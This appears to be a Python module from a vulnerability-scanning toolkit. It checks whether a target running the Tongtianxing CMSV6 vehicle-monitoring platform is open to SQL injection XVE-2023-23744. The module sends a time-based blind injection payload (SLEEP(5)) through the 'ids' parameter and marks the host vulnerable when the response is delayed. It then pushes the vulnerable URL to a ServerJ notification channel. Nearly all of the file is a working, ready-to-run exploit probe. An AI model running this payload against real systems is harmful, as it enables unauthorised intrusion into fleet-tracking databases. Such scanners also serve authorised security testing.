import time

from Config import ServerJ
from Config.Common_Request import common_request


# bugName = '通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)'


def scan_XVE_2023_23744(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
    }

    expected_time = 5  # 期望的回包时间，单位为秒
    start_time = time.time()
    response = common_request(url, path, headers, method='GET', timeout=10, proxies=proxies,
                                 append_to_output=append_to_output)
    end_time = time.time()
    response_time = end_time - start_time
    if response is not None:
        if response_time >= expected_time and response.status_code == 200:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
